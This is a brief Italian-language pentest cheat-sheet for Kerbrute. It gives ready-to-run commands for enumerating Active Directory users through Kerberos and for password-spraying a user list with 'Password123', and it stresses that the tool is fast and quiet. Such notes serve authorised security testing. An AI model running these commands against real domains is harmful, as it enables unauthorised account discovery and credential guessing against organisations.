# Kerbrute - attacchi Kerberos (enum utenti / password spray)
## Uso base
```
kerbrute userenum -d dominio.local --dc 10.0.0.5 utenti.txt
kerbrute passwordspray -d dominio.local utenti.txt 'Password123'
```
Veloce e "silenzioso" per enumerare utenti AD validi via Kerberos.
